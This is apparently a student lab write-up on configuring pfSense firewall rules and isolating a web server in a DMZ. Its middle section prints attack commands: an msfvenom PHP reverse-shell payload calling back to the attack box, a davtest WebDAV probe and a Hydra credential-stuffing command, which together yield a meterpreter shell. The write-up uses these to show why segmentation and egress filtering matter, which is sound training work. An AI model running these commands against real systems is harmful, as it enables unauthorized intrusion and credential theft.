# Configuring Network Segmentation and Security
<h3>Objectives</h3>

- Apply security solutions for infrastructure management
- Implement configuration changes to existing controls to improve security
#
<h3>pfSense Firewall</h3>

For this lab, I'll be using the pfSense firewall. pfSense is an open-source unified threat management (UTM) appliance created and maintained by Netgate. pfSence works as both a router and a firewall.

To  connect to the pfSense firewall, I just type in its IP into the browser: http://10.1.0.254
- 10.1.0.254 is this network's default gateway. Usually, the default gateway is a router, in this case, pfSense works as both a router and a firewall, and that is why it's this network's default gateway.
![image](https://github.com/user-attachments/assets/ae1d90aa-045d-49e2-b85b-98e6ca659194)
![image](https://github.com/user-attachments/assets/fe92ec5f-12df-4dd2-bf51-ef06452c75ec)
- This firewall/router is configured with one external and one internal interface. The firewall screens the local network segment from external networks, allowing only traffic to match the access control list (ACL).
#
<h3>Reviewing Firewall ACLs</h3>

I can access the ACL or rules by clicking **Firewall > Rules**
- Here I can see that there are multiple tabs, so there can be separate rules for the the WAN and LAN

![image](https://github.com/user-attachments/assets/cdcaae03-722e-41f8-bdbc-5f0c239e4243)
![image](https://github.com/user-attachments/assets/95711b78-a316-407f-827f-e24c73f9ca42)
- Several types of traffic are permitted into the LAN: ICMP (ping), DNS, HTTP/HTTPS, and SMTP.
- All except the ICMP rule, are forwarding rules meaning that traffic for those ports is directed to a host on the LAN.

Now on the **LAN tab**
![image](https://github.com/user-attachments/assets/4bc00873-6876-4173-a484-fb810bc2e080)
- Based on these rules, there is no egress filtering. Any type of traffic from a host on the LAN is permitted to any endpoint, **unless** a deny rule is placed higher in the ACL.
  - The order of the rules can be changed around since  the firewall prioritizes the rules from top to bottom, it will change how the firewall behaves with certain traffic.
- The **Anti-Lockout Rule** prevents the firewall from locking out an administrator from the web interface.
It's enabled by default and allows traffic from any source within the network to any firewall administration protocol listening on the LAN IP address.

If I now click on **Firewall > NAT**, it shows the hosts that are designated to receive traffic for DNS, HTTP/HTTPS, and SMTP.

![image](https://github.com/user-attachments/assets/be50cdea-d36b-40f9-9f6f-24db262ef564)
![image](https://github.com/user-attachments/assets/d9d7c69c-035e-4fb4-858b-951b4605f90b)
- Since the hosts on this network are not separated into different segments, if an attacker is able to gain access to the server than they can pivot onto other hosts.

#
<h3>Testing Host Security</h3>

In order to demonstrate how a server may make other hosts on the same segment vulnerable, I will run an attack against the web server.

On a Kali VM, which I'll be using as the attack box, I'll start msfconsole and run the following commands: 

1: msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.2.192 lport=8080 -f raw > /root/get.php
- Creates a reverse shell via PHP code
![image](https://github.com/user-attachments/assets/844f1c13-d830-4f2e-aa5c-0df1d04a3e03)

2: davtest -url http://www.515support.com/webdav
- I'll leverage the server’s webdav environment to upload malicious code
![image](https://github.com/user-attachments/assets/4e550bbe-86db-4537-b21d-61571f1a6d22)

This environment is password-protected so it failed to connect, however, I'll use the password cracker THC Hydra or Hydra and a wordlist containing possible usernames and password variations, and perform a credential-stuffing attack. 

Command: hydra -L /root/Downloads/users-515support.txt -P /root/Downloads/pwd-515support.txt www.515support.com http-get /webdav

![image](https://github.com/user-attachments/assets/9c1676b0-ecc5-4e98-906d-65d3f4719636)
- Hydra was able to crack the user/password combo of dev:Pa$$w0rd

Now I can try connecting again using these credentials
![image](https://github.com/user-attachments/assets/bc809845-89f7-4d4f-aa30-1463449c51fe)

Now that I'm connected I can start the listener

![image](https://github.com/user-attachments/assets/650491ad-54a3-4c62-82df-f7b303848371)

On a second terminal window, I'll run the following command to trigger the script and start the reverse shell
![image](https://github.com/user-attachments/assets/cb510199-1bdb-4420-a7b0-c091133b3d16)

Back on the terminal running msfconsole, the meterpreter shell was successful, and I now  have access to the server's command line.
![image](https://github.com/user-attachments/assets/2f47d67f-5dea-4131-b89a-b1c4909f184f)

Leaving the session in the background to try creating a hash dump, results in failure because I dont have root access.
![image](https://github.com/user-attachments/assets/bf494440-2074-445a-a097-4a89287538b6)

Trying a different method also yields no access, however, there is the potential for intrusion against other hosts on the same network as the server.
![image](https://github.com/user-attachments/assets/89437583-ba17-4b1d-a3e8-df2f3cf1f37f)

![image](https://github.com/user-attachments/assets/2f825b5b-1164-43e3-8993-94854a90d798)
![image](https://github.com/user-attachments/assets/51ce190a-304f-4179-82d2-ae5a05b05dbd)

The reason that it's possible to gain access to another host on the network is because of the firewall rules. There are no rules against certain outbound traffic or connections between the server and other hosts on the same network. 
If the firewall rules were filtering connections between this server and other hosts, and blocking unauthorized outbound connections, then this would not be possible.
#
<h3>Configuring Segmentation</h3>

Now I will configure the firewall so that the web server is isolated in a demilitarized zone (DMZ) segment, separate from other hosts.

In Hyper-V Manager, Virtual Switch Manager > Private > Create Virtual Switch and name the switch 'vDMZ'
![image](https://github.com/user-attachments/assets/a1add197-8bb8-4f8e-ad3c-23bcfca3e541)

Now in the settings menu for UTM1, I'll set the vDMZ switch for the hn2 adapter

![image](https://github.com/user-attachments/assets/42798972-644d-4d35-88bd-a82e55b927a2)
![image](https://github.com/user-attachments/assets/58165c35-a154-4592-b473-bd97cb7a873b)

And I'll do the same for LX1, on the eth0 adapter

![image](https://github.com/user-attachments/assets/9c084d65-9284-4079-93d0-a980177c841c)

Back on pfSense, click on **Interfaces > Assignments**
![image](https://github.com/user-attachments/assets/edda3a98-8f04-4080-8122-a25dbbb2bcfd)
And I added OPT1, which is UTM1's interface connected to the virtual switch (vDMZ)
![image](https://github.com/user-attachments/assets/b95b2700-816d-4e64-b19c-9de6bdeab33d)

Clicking on **Interfaces > OPT1**, I enabled the interface and set the IPv4 address as 10.1.254.254 /24 and to be static, then saved the configuration at the bottom of the menu

![image](https://github.com/user-attachments/assets/b0d2478e-d4d2-47f2-8fa0-b935ff3d8794)
![image](https://github.com/user-attachments/assets/83159cc6-a7b6-4dae-bc46-dd2506a4015c)

Clicking on **Firewall > NAT**, I'm going to edit the HTTP and HTTPS forwarding rules to redirect traffic to the server @ 10.1.254.10 

![image](https://github.com/user-attachments/assets/f0c07ae9-a6b1-48f0-9eb4-e56e9e42e891)
![image](https://github.com/user-attachments/assets/c88724ec-d65e-4e3b-a871-59872f688ff6)
![image](https://github.com/user-attachments/assets/7a3724ff-dd69-4889-9f1c-c5c8d8409e74)
![image](https://github.com/user-attachments/assets/33f1d600-1a2b-4405-b482-1c9701144195)

Then I went to **Status > System  Logs Settings** and enabled 'log firewall default blocks'
![image](https://github.com/user-attachments/assets/2e9eebf6-09e8-40fe-a4d9-cc6ec83b4ccf)

The last thing I need to do is add the server to the DMZ subnet, by reconfiguring its IP settings
![image](https://github.com/user-attachments/assets/3e2ca707-4868-490f-8e56-4ff9f44dfedc)

Now that I changed the IP to the server the connection to the attack box has died, so there is no current reverse shell
![image](https://github.com/user-attachments/assets/5ebf2d36-33d4-4e0a-bbb6-203b72362e80)
#
<h3>Testing Segmentation</h3>

If I try to establish another reverse shell (same way as before, starting the listener, and using the curl command to create the reverse shell), it will not work because the ACL rules are configured to apply only to incoming new connections on each interface, so the default block on OPT1 stops the web server from initiating new connections. The ACL rules only allow connections started by external hosts rather than a connection started by the server to an external host (reverse shell).

Checking the firewall logs (**Status > System Logs > Firewall**), we see just that. Any traffic from the server (10.1.254.10) to the attack box (192.168.2.192), is blocked. But traffic from the attack box to the server is not.
![image](https://github.com/user-attachments/assets/45e04c13-f741-4372-a9c5-9cf2299d1dce)
![image](https://github.com/user-attachments/assets/0bc78382-f4c1-4bb0-852f-7cf51cdec408)

This is a hidden, default deny rule, that blocks any inbound traffic to the WAN interface from an external network.
![image](https://github.com/user-attachments/assets/96927429-a1ee-40fd-b75b-77d53edc1318)

Now the server has been successfully isolated from the other hosts on the network.
#
<h3>Challenge</h3>

**Configure an ACL that blocks hosts on the vLOCAL switch/LAN net from accessing anything other than SSH and HTTP/HTTPS on the vDMZ switch/OPT1 net.**

These are the four rules I made to make this possible. Each one either allows/denies traffic specifically from the LAN net, to the OPT1 net. The deny rule denies all traffic including SSH, HTTP/HTTPS but I put it at the bottom of the list so that it will not trigger before the other allow rules, that way SSH, and HTTP/HTTPS traffic can still pass through.
![image](https://github.com/user-attachments/assets/d2e62656-5499-4b03-8eba-89353252ee56)

To test whether on not the ACL rules work I first tried accessing http://www.515web.net and http://10.1.254.10 from a VM that was on the LAN net, and both were successful.
![image](https://github.com/user-attachments/assets/58fe5c65-ab81-4ef9-9701-b570d8115f83)
![image](https://github.com/user-attachments/assets/d93681d5-aef6-437d-af7c-c267d8aa5b5b)

Lastly, I switched the Linux VM (attack box), to the LAN net and used Nmap to test ports 22, 53, 80, and 443, and since it worked correctly DNS port 53 was shown as filtered and the rest were open.
- I also tested against the top 100 ports and as expected 97 came back as filtered and 22, 80, and 443 were open.
![image](https://github.com/user-attachments/assets/cc91a8a2-df07-423c-a21f-34682a354867)
![image](https://github.com/user-attachments/assets/ad3f6ace-9550-4fb9-b0ad-9f7ba8a4d5d0)

I also used Netcat to show that traffic over common ports like 21, 23, 25, and 53 are not allowed, but 22, 80, and 443 are allowed
![image](https://github.com/user-attachments/assets/aa38d290-ac04-4cd7-a1df-da7b11d5d6ef)
![image](https://github.com/user-attachments/assets/045adc42-ea13-4229-9729-ccf6b91bb027)

#
**Summary: In this lab, I was able to get some hands-on experience with the pfSense UTM, and test ACL rules to permit or deny traffic based on security requirements. I also used MSFconsole to simulate an attack, which was possible due to poorly configured security controls.**



